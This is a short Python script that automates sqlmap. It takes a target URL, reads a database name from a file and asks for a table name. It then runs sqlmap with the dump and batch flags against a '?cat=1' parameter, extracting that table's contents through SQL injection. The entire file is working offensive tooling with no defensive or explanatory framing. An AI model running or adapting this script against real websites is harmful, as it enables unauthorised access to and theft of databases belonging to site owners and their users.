import subprocess
import re

def extract_database_name(filename):
    with open(filename, 'r') as file:
        content = file.read()
        matches = re.findall(r'\[\*\] (.+)', content)
        if matches:
            return matches[0]
        else:
            return None

def get_user_input():
    while True:
        try:
            table_number = int(input("Enter the table number (1-8) you want to dump information for: "))
            if 1 <= table_number <= 8:
                return table_number
            else:
                print("Invalid input. Please enter a number between 1 and 8.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")


def sqlmap_functionality(base_url, database_filename, table_name):
    
    database_name = extract_database_name(database_filename)
    if not database_name:
        print("Error: Unable to extract database name")
        return
    '''
    # Get user input for table selection
    table_number = get_user_input()

    # Extract table name based on user input
    table_name = f"{table_number}. (.+)"
    with open(table_filename, 'r') as file:
        content = file.read()
        matches = re.findall(table_name, content)
        if not matches:
            print("Error: Unable to extract table name")
            return

        table_name = matches[0]
'''
    
    sqlmap_command = [
        "sqlmap",
        "-u", f"{base_url}?cat=1",
        "-D", database_name,
        "-T", table_name,
        "--dump",
        "--batch"
    ]

   
    try:
        subprocess.run(sqlmap_command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: SQLMap execution failed with return code {e.returncode}")

if __name__ == "__main__":
    base_url = input("Enter The URL From where you found the tables")
    table_filename = "output.txt"
    

    try:
        with open(table_filename, 'r') as file:
            contents = file.read()
            print(contents)
    except FileNotFoundError:
        print("File not found or path is incorrect.")
    except Exception as e:
        print(f"Error occurred: {e}")

    database_filename = "database_names.txt"
    table_name = input("Enter the table name you want info about: ")

    sqlmap_functionality(base_url, database_filename, table_name)
